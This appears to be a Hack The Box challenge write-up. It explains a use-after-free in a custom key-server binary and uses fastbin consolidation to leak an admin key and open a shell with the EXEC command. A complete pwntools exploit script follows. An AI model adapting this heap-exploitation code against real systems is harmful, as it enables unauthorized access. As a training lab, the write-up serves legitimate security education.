![img](assets/banner.png)

<img src='assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'><Challenge_Name></font>

20<sup>th</sup> May 2024

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='orange'>Medium</font>

<br><br>

# Synopsis (!)

- Exploit program logic
- Exploiting use after free
- Exploiting fastbin consilidation

## Description (!)

- Welcome to Operation Red Roch, Your mission, should you choose to accept it. Find a zero day in this protocol to gain access in the system. Your exploit will be used by our Red Team in their next mission. Good luck.

## Skills Required (!)

- Good knowledge of heap exploitation
- Reverse engineering

## Skills Learned (!)

- Learn how to exploit logic mistakes in binary.
- Learn how to use fastbin consolidation for exploitation.
- Lean about use-after-free.


# Solution (!)


## Understanding the program flow.
The program is a server you connect to it with a client for example netcat.
After connecting the program providing you with command to execute.
If you typed HELP you can see the list of commands.
```
Hello in Keys Holding Protocol Server. 
Available Commands: 
	REKE: Register new user:key. 
	DEKE: Delete key, usage: DEKE ID (e.g DEKE 5)  
	SAVE: To save a key, usage: SAVE ID (e.g SAVE 5) 
    DDKE: Delete key from database, usage: DDKE ID (e.g DDKE 5)
	AUTH: Authenticate with rgistered user:key, usage: AUTH ID (e.g AUTH 5) 
	GTPR: Get current profile. 
	RLDB: Reload the database. 
	EXEC: Open a shell. (Only for Admins). 
	HELP: To show this message. 
	EXIT: To exit. 

```
1. REKE: You can register a new user:key pair that will be saved in a heap chunk, you don't acctualy need to set it to user:key pair , you can put what ever you want but for it to work you better use user:key pair.
2. DEKE: This option free the chunk created for the key you registered with REKE.
3. SAVE: This command save the key you registered in the database (which is the file called users.keys :) ).
4. DDKE: This command delete the key from the database if it's exist.
5. AUTH: This command is used to authenticate you self, For admins to be able to run commands with EXEC.
6. GTPR: This command get you the information of the key you are authenticated with.
7. RLDB: When you try to interact with the database it's been loaded into a heap chunk , if you maked any change to the database like saving/deleting keys you need to reload the database into the program, here is the command you use.

## Find the logic mistake that leads to use-after-free.

In the Auth function after decompile it you will notice this line.

```c
CURRENT_PROFILE = (char *)*((_QWORD *)&IN_MEM_KEYS + (int)v17);
```

It's using CURRENT_PROFILE to remember your current authenticated key, It's supposed to be address to IN_MEM_KEYS + v17 (which is the id of the key) , but instead it puting the address of heap directly into the CURRENT_PROFILE, which leads to use-after-free, when you delete key it's will be removed from IN_MEM_KEYS but the authenticated key will remain in CURRENT_PROFILE , from here we can now see how we can use this.

## Fastbin

As you know from interacting with the program that we can have 10 keys (10 chunks), from here we knows that we can have 7 in tcache and then use the fastbins.

## Fastbin consolidation

When you have a fastbin chunk in the top of the heap and then allocate a big chunk (bigger than tcache chunks , 24-1032 bytes).

So if we controled the address of the fastbin chunk and then consolidate it with the chunk of the database we can leak the admin key which will allow us to use the EXEC command.

Now all we need is to increase the size of the database by adding keys to it so it's become bigger than 1032 bytes.

## Plan

1. Save some keys to database to increase it's size.
2. Allocate 8 chunks.
3. Authenticate with chunk in index 8, then when free we have a fastbin chunk.
4. Free the chunks to fill tcache and have a fastbin chunk.
5. Reload the database will free the old database heap and allocate a new one , because of the new size of the database it will allocate a new bigger chunk which will consolidate the fastbin chunk that we have it's address in the CURRENT_PROFILE variable, then use GTPR to get the profile and leak the key.
6. Use the admin key to authenticate and run EXEC.

## Exploit steps

Import required modules and connect to the server
```python
from pwn import *
import secrets
import string
from time import sleep

HOST = "0" ; PORT = 8080
io = remote(HOST, PORT)
```

1. Save some keys to database to increase it's size.
```python
def gen(length):
    alphabet = string.ascii_letters + string.digits
    return (''.join(secrets.choice(alphabet) for _ in range(length))).encode()
```
I wrote this function to generate some random strings , Which i will use later to generate keys like
USER:ROLE T3dKZVRXSTh4Qm1OeEhORjY5ZVRKbkVVQ0pNQW1MMmk1eEQ5emh0MG5Eb3FDa3hIWHUK;

Here is the code for saving keys to the database
```python
for i in range(1, 15):
    prog = log.progress("Registering new key", "...")
    key = b"hacker" + gen(1) + b":user " + gen(68) + b";"
    
    if reg(key):
       prog.success(key.decode())
    else:
       prog.failure(key.decode())

    prog = log.progress("Saving key: ", "...")
    
    if save(1):
       prog.success("Saved")
    else:
       prog.failure("Not Saved")
    
    delk(1)
    sleep(1)
```
I have used only one chunk to store, save the key then delete the chunk to use it again.

2. Allocate 8 chunks.

```python
for i in range(1, 8):
    reg(key)
```

3. Authenticate with chunk in index 8, then when free we have a fastbin chunk.
```python
MASTER_KEY = b"master:user " + gen(68) + b";"

log.info("Exploiting UAC")
log.info("Save the master key.")
reg(MASTER_KEY)
save(8)
reload_db()
auth(8)
```
I used a key called it master key , you can use any normal key but I liked the idea of using special key to my exploit ;).

4. Free the chunks to fill tcache and have a fastbin chunk.
```python
for i in range(1, 9):
    sleep(1)
    delk(i)
```

5. Reload the database will free the old database heap and allocate a new one , because of the new size of the database it will allocate a new bigger chunk which will consolidate the fastbin chunk that we have it's address in the CURRENT_PROFILE variable, then use GTPR to get the profile and leak the key.
```python
reload_db()
```

6. Use the admin key to authenticate and run EXEC.
```python
io.clean()
log.info("Getting master key...")

io.sendline(b"GTPR") # Getting the master key using the use-after-free
leak = io.readline()[9:-1]
log.info("Master key: {}".format(leak.decode()))

log.info("Authenticate with master key")
reg(leak)
io.readuntil(b"->")
ID = io.readline()

auth(int(ID[:-1]))
sleep(1)
io.sendline(b"EXEC")
io.interactive()
```

## Final exploit:
```python
#!/usr/bin/python3

from pwn import *
import secrets
import string
from time import sleep

HOST = "0" ; PORT = 8080
io = remote(HOST, PORT)

def reg(pair):
    io.sendline(b"REKE " + pair)
    if io.readuntil(b"Registered: ID"):
        return True
    return False


def auth(Id):
    io.sendline(b"AUTH " + str(Id).encode())

def delk(Id):
    io.sendline(b"DEKE " + str(Id).encode())
    if io.readuntil(b"successfuly"):
        return True
    return False

def save(Id):
    io.sendline(b"SAVE " + str(Id).encode())
    if io.readuntil(b"Saved"):
        return True
    return False

def reload_db():
    io.sendline(b"RLDB")

def gen(length):
    alphabet = string.ascii_letters + string.digits
    return (''.join(secrets.choice(alphabet) for _ in range(length))).encode()

io.timeout = 5

log.info("Register and save the keys into the database to increase the file size...")


for i in range(1, 15):
    prog = log.progress("Registering new key", "...")
    key = b"hacker" + gen(1) + b":user " + gen(68) + b";"
    
    if reg(key):
       prog.success(key.decode())
    else:
       prog.failure(key.decode())

    prog = log.progress("Saving key: ", "...")
    
    if save(1):
       prog.success("Saved")
    else:
       prog.failure("Not Saved")
    
    delk(1)
    sleep(1)

for i in range(1, 8):
    reg(key)

MASTER_KEY = b"master:user " + gen(68) + b";"

log.info("Exploiting UAC")
log.info("Save the master key.")
reg(MASTER_KEY)
save(8)
reload_db()
auth(8)

log.info("Fill up tcache")

for i in range(1, 9):
    sleep(1)
    delk(i)
    
reload_db()

io.clean()
log.info("Getting master key...")

io.sendline(b"GTPR") # Getting the master key using the use-after-free
leak = io.readline()[9:-1]
log.info("Master key: {}".format(leak.decode()))

log.info("Authenticate with master key")
reg(leak)
io.readuntil(b"->")
ID = io.readline()

auth(int(ID[:-1]))
sleep(1)
io.sendline(b"EXEC")
io.interactive()
```